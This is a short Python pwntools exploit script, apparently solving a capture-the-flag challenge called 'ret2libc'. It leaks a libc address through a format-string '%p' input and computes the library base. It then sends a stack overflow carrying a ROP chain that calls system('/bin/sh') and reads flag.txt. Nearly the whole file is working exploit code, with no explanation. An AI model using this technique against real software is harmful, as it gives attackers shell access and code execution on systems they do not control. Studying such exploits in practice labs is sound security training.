#!/usr/bin/env python3

from pwn import *

TARGET = './ret2libc'
context.arch = 'amd64'
elf = ELF(TARGET)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process(TARGET)

# gdb_script = f"""
#   b *main
#   c
# """
# context.terminal = [
#   'wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc'
# ]
# p = gdb.debug(TARGET, gdbscript=gdb_script)

# EXPLOIT #
p1 = b'%p'
p.sendlineafter(b'> ', p1)
libc_leak = int(p.recvline()[:-1].strip(), 16)
libc.address = libc_leak - 0x1d3b03
rop = ROP(libc)
print(f"libc leak: {hex(libc_leak)}")
print(f"libc base: {hex(libc.address)}")

ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym.system
print(f"ret      : {hex(ret)}")
print(f"pop rdi  : {hex(pop_rdi)}")
print(f"/bin/sh  : {hex(binsh)}")
print(f"system() : {hex(system)}")

p2 = b'A' * 64 + b'B' * 8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendlineafter(b'Value: ', p2)

p.sendline(b'cat flag.txt')
p.interactive()